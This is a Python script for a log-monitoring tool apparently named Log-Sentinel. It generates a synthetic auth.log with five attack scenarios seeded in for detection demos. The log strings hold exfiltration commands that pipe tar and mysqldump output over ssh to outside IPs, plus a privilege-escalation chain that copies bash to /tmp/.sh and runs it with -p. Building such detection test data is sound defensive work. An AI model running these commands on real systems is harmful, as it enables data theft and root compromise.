"""
backend/demo_data.py — Generates a realistic ~3000-line auth.log demo file
with 5 embedded anomaly scenarios for Log-Sentinel.

Run directly:  python demo_data.py
Output:        ../demo/sample.log
"""

import os
import random
import string
from datetime import datetime, timedelta
from pathlib import Path

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

BASE_DATE = datetime(2025, 4, 10)  # 2025-Apr-10

MONTHS_ABBR = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

HOSTNAMES = ["prod-web-01", "prod-web-02", "prod-db-01", "bastion-01"]
NORMAL_IPS = [
    "10.0.1.15", "10.0.1.22", "10.0.1.45", "10.0.2.10",
    "172.16.0.5", "192.168.1.100", "192.168.1.101",
    "203.0.113.10", "203.0.113.45", "198.51.100.23",
]
SERVICES = ["sshd", "sudo", "cron", "systemd", "kernel", "CRON"]
NORMAL_USERS = ["alice", "bob", "charlie", "diana", "eve",
                "frank", "grace", "henry", "iris", "jack"]
CRON_JOBS = [
    "CMD (/usr/local/bin/backup.sh)",
    "CMD (/usr/bin/apt-get -q update)",
    "CMD (/usr/local/bin/health_check.sh)",
    "CMD (/usr/bin/logrotate /etc/logrotate.conf)",
    "CMD (/home/alice/bin/sync.sh)",
]


def fmt_ts(dt: datetime) -> str:
    """Format as syslog timestamp: 'Apr 10 14:23:05'"""
    return f"{MONTHS_ABBR[dt.month - 1]} {dt.day:2d} {dt.strftime('%H:%M:%S')}"


def line(dt: datetime, host: str, service: str, msg: str) -> str:
    return f"{fmt_ts(dt)} {host} {service}: {msg}"


def rand_port() -> int:
    return random.randint(30000, 65000)


def rand_session() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=12))


# ---------------------------------------------------------------------------
# Normal baseline traffic generators
# ---------------------------------------------------------------------------

def gen_normal_ssh_success(dt: datetime) -> str:
    host = random.choice(HOSTNAMES[:2])
    user = random.choice(NORMAL_USERS)
    ip = random.choice(NORMAL_IPS)
    port = rand_port()
    return line(dt, host, "sshd[%d]" % random.randint(1000, 9999),
                f"Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{rand_session()}")


def gen_normal_ssh_fail(dt: datetime) -> str:
    host = random.choice(HOSTNAMES[:2])
    user = random.choice(NORMAL_USERS + ["invalid", "test", "guest"])
    ip = random.choice(NORMAL_IPS)
    port = rand_port()
    return line(dt, host, "sshd[%d]" % random.randint(1000, 9999),
                f"Failed password for {user} from {ip} port {port} ssh2")


def gen_cron(dt: datetime) -> str:
    host = random.choice(HOSTNAMES)
    user = random.choice(NORMAL_USERS)
    job = random.choice(CRON_JOBS)
    return line(dt, host, "CRON[%d]" % random.randint(1000, 9999),
                f"({user}) {job}")


def gen_sudo(dt: datetime) -> str:
    host = random.choice(HOSTNAMES)
    user = random.choice(NORMAL_USERS)
    target = random.choice(SERVICES[:3])
    cmd = random.choice(["/usr/bin/apt-get install", "/usr/sbin/service %s restart" % target,
                         "/usr/bin/systemctl reload nginx"])
    return line(dt, host, "sudo",
                f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=%s" % cmd)


def gen_session_open(dt: datetime) -> str:
    host = random.choice(HOSTNAMES[:2])
    user = random.choice(NORMAL_USERS)
    pid = random.randint(1000, 9999)
    return line(dt, host, "sshd[%d]" % pid,
                f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")


def gen_session_close(dt: datetime) -> str:
    host = random.choice(HOSTNAMES[:2])
    user = random.choice(NORMAL_USERS)
    pid = random.randint(1000, 9999)
    return line(dt, host, "sshd[%d]" % pid,
                f"pam_unix(sshd:session): session closed for user {user}")


def gen_systemd(dt: datetime) -> str:
    host = random.choice(HOSTNAMES)
    services_list = ["nginx.service", "postgresql.service", "redis.service", "sshd.service"]
    svc = random.choice(services_list)
    msgs = [
        f"Started {svc}.",
        f"Reloading {svc}.",
        f"Sending signal SIGHUP to main process of {svc}.",
        f"systemd[1]: {svc}: Watchdog keepalive from PID {random.randint(1000,9999)} OK",
    ]
    return line(dt, host, "systemd[1]", random.choice(msgs))


def gen_kernel(dt: datetime) -> str:
    host = random.choice(HOSTNAMES)
    msgs = [
        "kernel: TCP: request_sock_TCP: Possible SYN flooding. Sending cookies.",
        "kernel: audit: type=1400 audit(1681123200.000:100): apparmor='ALLOWED'",
        f"kernel: device eth0 entered promiscuous mode",
    ]
    return line(dt, host, "kernel", random.choice(msgs))


# ---------------------------------------------------------------------------
# Anomaly scenario generators
# ---------------------------------------------------------------------------

# SCENARIO 1: Brute force SSH from 185.220.101.x (Tor exit) at 02:14:33
BRUTE_IP_BASE = "185.220.101."
BRUTE_TARGETS = ["root", "admin", "postgres", "ubuntu", "pi", "deploy", "git", "test"]


def gen_brute_force_block(lines: list, start: datetime):
    """847 failed SSH attempts over ~5 minutes starting at 02:14:33"""
    host = "prod-web-01"
    for i in range(847):
        dt = start + timedelta(seconds=i * 0.35 + random.uniform(-0.05, 0.05))
        last_octet = random.randint(1, 254)
        ip = f"{BRUTE_IP_BASE}{last_octet}"
        user = random.choice(BRUTE_TARGETS)
        port = rand_port()
        lines.append(line(dt, host, "sshd[%d]" % random.randint(10000, 19999),
                          f"Failed password for {user} from {ip} port {port} ssh2"))
        # Occasional "invalid user" variant
        if i % 13 == 0:
            lines.append(line(dt + timedelta(milliseconds=50), host,
                              "sshd[%d]" % random.randint(10000, 19999),
                              f"Invalid user {user} from {ip} port {port}"))


# SCENARIO 2: Impossible travel — j.kapoor
KAPOOR_IP_SF = "104.28.9.234"
KAPOOR_IP_NG = "41.203.18.77"


def gen_impossible_travel(lines: list):
    host = "prod-web-01"
    dt_sf = BASE_DATE.replace(hour=8, minute=43, second=11)
    dt_ng = BASE_DATE.replace(hour=9, minute=1, second=47)

    # SF login
    lines.append(line(dt_sf, host, "sshd[24501]",
                      f"Accepted password for j.kapoor from {KAPOOR_IP_SF} port 52341 ssh2"))
    lines.append(line(dt_sf + timedelta(seconds=1), host, "sshd[24501]",
                      f"pam_unix(sshd:session): session opened for user j.kapoor by (uid=0)"))
    lines.append(line(dt_sf + timedelta(seconds=5), host, "sshd[24501]",
                      f"j.kapoor : TTY=pts/2 ; PWD=/home/j.kapoor ; USER=j.kapoor ; COMMAND=/usr/bin/rsync -avz /data/exports/ {KAPOOR_IP_SF}:/backup/"))
    lines.append(line(dt_sf + timedelta(seconds=10), host, "sshd[24501]",
                      f"pam_unix(sshd:session): session closed for user j.kapoor"))

    # Lagos login (same user, 18 min later, different continent)
    lines.append(line(dt_ng, host, "sshd[24889]",
                      f"Accepted password for j.kapoor from {KAPOOR_IP_NG} port 61002 ssh2"))
    lines.append(line(dt_ng + timedelta(seconds=2), host, "sshd[24889]",
                      f"pam_unix(sshd:session): session opened for user j.kapoor by (uid=0)"))
    lines.append(line(dt_ng + timedelta(seconds=8), host, "sshd[24889]",
                      f"j.kapoor : TTY=pts/3 ; PWD=/data ; USER=root ; COMMAND=/usr/bin/tar czf - /data/exports/ | ssh {KAPOOR_IP_NG} 'cat > /tmp/alldata.tar.gz'"))
    lines.append(line(dt_ng + timedelta(seconds=60), host, "sshd[24889]",
                      f"pam_unix(sshd:session): session closed for user j.kapoor"))


# SCENARIO 3: Privilege escalation chain at 03:22:17
PRIV_ESC_START = BASE_DATE.replace(hour=3, minute=22, second=17)


def gen_privilege_escalation(lines: list):
    host = "prod-web-01"
    dt = PRIV_ESC_START
    pid_web = 31337
    pid_backup = 31338
    pid_root = 31339

    lines.append(line(dt, host, "sshd[31100]",
                      f"Accepted publickey for www-data from 10.0.1.200 port 44001 ssh2"))
    lines.append(line(dt + timedelta(seconds=2), host, f"sudo",
                      f"www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=backup ; COMMAND=/usr/bin/find / -perm -4000"))
    lines.append(line(dt + timedelta(seconds=8), host, f"sudo",
                      f"www-data : TTY=pts/1 ; PWD=/var/www/html ; USER=backup ; COMMAND=/usr/bin/cp /bin/bash /tmp/.sh"))
    lines.append(line(dt + timedelta(seconds=14), host, f"kernel",
                      f"audit: type=1400 audit(1681300937.000:{pid_backup}): exe=\"/usr/bin/sudo\" uid=33 gid=33 euid=34 egid=34"))
    lines.append(line(dt + timedelta(seconds=20), host, "sudo",
                      f"backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.sh -p"))
    lines.append(line(dt + timedelta(seconds=26), host, "kernel",
                      f"audit: type=1105 audit(1681300943.000:{pid_root}): login pid={pid_root} uid=0 exe='/tmp/.sh' hostname=localhost"))
    lines.append(line(dt + timedelta(seconds=34), host, "sudo",
                      f"root : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -i"))
    lines.append(line(dt + timedelta(seconds=35), host, "sshd[31100]",
                      f"pam_unix(sshd:session): session opened for user root by (uid=0)"))


# SCENARIO 4: Port scan from 45.142.212.90 (RU) at 01:05
PORT_SCAN_START = BASE_DATE.replace(hour=1, minute=5, second=0)
PORT_SCAN_IP = "45.142.212.90"


def gen_port_scan(lines: list):
    host = "bastion-01"
    for i in range(0, 1847):
        dt = PORT_SCAN_START + timedelta(milliseconds=i * 88)
        port = i + 1  # sequential, starting at 1 — definitive scan signature
        lines.append(line(dt, host, "kernel",
                          f"kernel: TCP: SYN from {PORT_SCAN_IP} port {rand_port()} to 0.0.0.0 port {port} — DROP"))
    # Also add a few connection refused logs
    for port in [22, 80, 443, 3306, 5432, 8080]:
        dt = PORT_SCAN_START + timedelta(seconds=port * 0.1)
        lines.append(line(dt, host, "kernel",
                          f"kernel: TCP: connection from {PORT_SCAN_IP} port {rand_port()} to port {port} REFUSED"))


# SCENARIO 5: Off-hours DB dump at 03:47
DB_DUMP_START = BASE_DATE.replace(hour=3, minute=47, second=0)
EXFIL_IP = "178.62.55.19"


def gen_db_exfil(lines: list):
    host = "prod-db-01"
    dt = DB_DUMP_START

    lines.append(line(dt, host, "CRON[44201]",
                      f"(db_readonly_svc) CMD (/usr/bin/mysqldump --all-databases --single-transaction)"))
    lines.append(line(dt + timedelta(seconds=3), host, "sshd[44210]",
                      f"Accepted publickey for db_readonly_svc from 10.0.2.50 port 33201 ssh2"))
    lines.append(line(dt + timedelta(seconds=5), host, "sudo",
                      f"db_readonly_svc : TTY=pts/4 ; PWD=/var/lib/mysql ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases --single-transaction --quick --lock-tables=false"))
    lines.append(line(dt + timedelta(seconds=10), host, "kernel",
                      f"kernel: TCP: new connection from 10.0.2.50 to {EXFIL_IP}:22 — ESTABLISHED"))
    lines.append(line(dt + timedelta(seconds=12), host, "sshd[44210]",
                      f"db_readonly_svc : TTY=pts/4 ; PWD=/tmp ; USER=db_readonly_svc ; COMMAND=/usr/bin/mysqldump --all-databases | gzip | ssh root@{EXFIL_IP} 'cat > /data/dump_$(date +%Y%m%d).sql.gz'"))
    lines.append(line(dt + timedelta(minutes=4, seconds=17), host, "kernel",
                      f"kernel: TCP: 2428MB transferred from 10.0.2.50 to {EXFIL_IP}:22 — connection closed"))
    lines.append(line(dt + timedelta(minutes=4, seconds=20), host, "sshd[44210]",
                      f"pam_unix(sshd:session): session closed for user db_readonly_svc"))


# ---------------------------------------------------------------------------
# Main generator
# ---------------------------------------------------------------------------

def generate_demo_log() -> str:
    random.seed(42)
    lines: list[str] = []

    # ---- PHASE 1: 00:00 – 01:04 normal traffic ----
    dt = BASE_DATE
    while dt < BASE_DATE.replace(hour=1, minute=5):
        interval = random.uniform(2, 12)
        dt += timedelta(seconds=interval)
        choice = random.random()
        if choice < 0.40:
            lines.append(gen_normal_ssh_success(dt))
        elif choice < 0.55:
            lines.append(gen_normal_ssh_fail(dt))
        elif choice < 0.70:
            lines.append(gen_cron(dt))
        elif choice < 0.80:
            lines.append(gen_session_open(dt))
        elif choice < 0.85:
            lines.append(gen_session_close(dt))
        elif choice < 0.92:
            lines.append(gen_systemd(dt))
        else:
            lines.append(gen_kernel(dt))

    # ---- SCENARIO 4: Port scan at 01:05 ----
    gen_port_scan(lines)

    # ---- PHASE 2: 01:05 – 02:14 normal traffic ----
    dt = BASE_DATE.replace(hour=1, minute=5)
    while dt < BASE_DATE.replace(hour=2, minute=14, second=33):
        interval = random.uniform(3, 15)
        dt += timedelta(seconds=interval)
        choice = random.random()
        if choice < 0.45:
            lines.append(gen_normal_ssh_success(dt))
        elif choice < 0.60:
            lines.append(gen_normal_ssh_fail(dt))
        elif choice < 0.75:
            lines.append(gen_cron(dt))
        else:
            lines.append(gen_sudo(dt) if random.random() < 0.3 else gen_systemd(dt))

    # ---- SCENARIO 1: Brute force at 02:14:33 ----
    brute_start = BASE_DATE.replace(hour=2, minute=14, second=33)
    gen_brute_force_block(lines, brute_start)

    # ---- PHASE 3: 02:14 – 03:22 normal traffic ----
    dt = BASE_DATE.replace(hour=2, minute=19, second=10)
    while dt < PRIV_ESC_START:
        interval = random.uniform(2, 10)
        dt += timedelta(seconds=interval)
        lines.append(random.choice([
            gen_normal_ssh_success(dt),
            gen_cron(dt),
            gen_systemd(dt),
            gen_session_close(dt),
        ]))

    # ---- SCENARIO 3: Privilege escalation at 03:22:17 ----
    gen_privilege_escalation(lines)

    # ---- PHASE 4: 03:22 – 03:47 sparse night traffic ----
    dt = PRIV_ESC_START + timedelta(seconds=40)
    while dt < DB_DUMP_START:
        interval = random.uniform(10, 40)
        dt += timedelta(seconds=interval)
        lines.append(random.choice([gen_cron(dt), gen_systemd(dt), gen_kernel(dt)]))

    # ---- SCENARIO 5: DB exfil at 03:47 ----
    gen_db_exfil(lines)

    # ---- PHASE 5: 03:47 – 08:43 night into morning traffic ----
    dt = DB_DUMP_START + timedelta(minutes=5)
    while dt < BASE_DATE.replace(hour=8, minute=43):
        interval = random.uniform(5, 25)
        dt += timedelta(seconds=interval)
        choice = random.random()
        if choice < 0.30:
            lines.append(gen_cron(dt))
        elif choice < 0.55:
            lines.append(gen_normal_ssh_success(dt))
        elif choice < 0.70:
            lines.append(gen_systemd(dt))
        elif choice < 0.82:
            lines.append(gen_session_open(dt))
        else:
            lines.append(gen_sudo(dt))

    # ---- SCENARIO 2: Impossible travel at 08:43 ----
    gen_impossible_travel(lines)

    # ---- PHASE 6: 09:02 – 12:00 normal business hours ----
    dt = BASE_DATE.replace(hour=9, minute=2)
    while dt < BASE_DATE.replace(hour=12, minute=0):
        interval = random.uniform(1, 8)
        dt += timedelta(seconds=interval)
        choice = random.random()
        if choice < 0.40:
            lines.append(gen_normal_ssh_success(dt))
        elif choice < 0.50:
            lines.append(gen_normal_ssh_fail(dt))
        elif choice < 0.65:
            lines.append(gen_session_open(dt))
        elif choice < 0.75:
            lines.append(gen_session_close(dt))
        elif choice < 0.85:
            lines.append(gen_cron(dt))
        else:
            lines.append(gen_sudo(dt) if random.random() < 0.5 else gen_systemd(dt))

    # Sort by the timestamp string (lexicographic is fine for syslog format)
    lines.sort(key=lambda l: l[:15])

    print(f"[demo_data] Generated {len(lines)} log lines.")
    return "\n".join(lines) + "\n"


if __name__ == "__main__":
    output_dir = Path(__file__).parent.parent / "demo"
    output_dir.mkdir(parents=True, exist_ok=True)
    output_path = output_dir / "sample.log"
    log_content = generate_demo_log()
    output_path.write_text(log_content, encoding="utf-8")
    print(f"[demo_data] Written to {output_path}")
